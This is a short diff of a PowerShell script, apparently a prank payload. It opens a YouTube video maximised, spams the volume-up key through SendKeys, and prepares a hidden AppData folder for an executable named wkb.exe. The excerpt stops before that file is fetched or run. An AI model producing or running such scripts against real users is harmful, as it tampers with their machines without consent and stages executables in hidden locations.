@@ -1,5 +1,5 @@
-Start-Process "http://youtu.be/3URtTIdnXIk"
-1..50 | ForEach-Object {1..25 | ForEach-Object {(New-Object -ComObject WScript.Shell).SendKeys([char]175)}}
+Start-Process -WindowStyle Maximized "https://www.youtube.com/watch?v=3URtTIdnXIk"
+1..25 | ForEach-Object {(New-Object -ComObject WScript.Shell).SendKeys([char]175)}
 $i = "C:\Users\Solomon\AppData\Local\WKB"
 if (-not (Test-Path $i)) {md $i -Force}
 $f = "$i\wkb.exe"
